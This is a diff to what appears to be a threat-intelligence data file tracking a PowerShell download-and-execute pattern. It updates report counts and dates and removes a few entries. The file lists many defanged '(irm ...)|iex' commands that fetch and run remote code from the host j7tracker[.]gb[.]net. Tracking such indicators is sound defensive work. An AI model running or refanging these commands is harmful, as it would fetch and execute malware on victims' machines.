@@ -1,13 +1,11 @@
 [
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 79,
-    "ReportCount": 79,
-    "FirstSeen": "2026-11-19T13:43:17.240000+00:00",
+    "DistinctPayloadCount": 77,
+    "ReportCount": 77,
+    "FirstSeen": "2026-11-19T23:19:43.828000+00:00",
     "LastSeen": "2026-11-26T03:18:21.600000+00:00",
     "ReportIds": [
-      "cmwnlotyh1wyr0omlqyh8e3xl",
-      "cmwnlp7zj1wzj0omlkec6jirx",
       "cmwo6a5551xu40omla5b849lo",
       "cmwo9kdgz1ys80omlr22sxrni",
       "cmwodzfal1z0v0omlds2tteaj",
@@ -114,7 +112,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/84f2366248b4f913')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8718dba3c8e47827')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8c4ac79ebaf0d7c0')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8fb0bb4d10428484')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9430b97dfeaa939b')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
@@ -133,7 +130,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b9e1b8494cf52e32')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ba4873e5c111ee58')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/bc80cbabe7050d7d')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7996060e99801d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
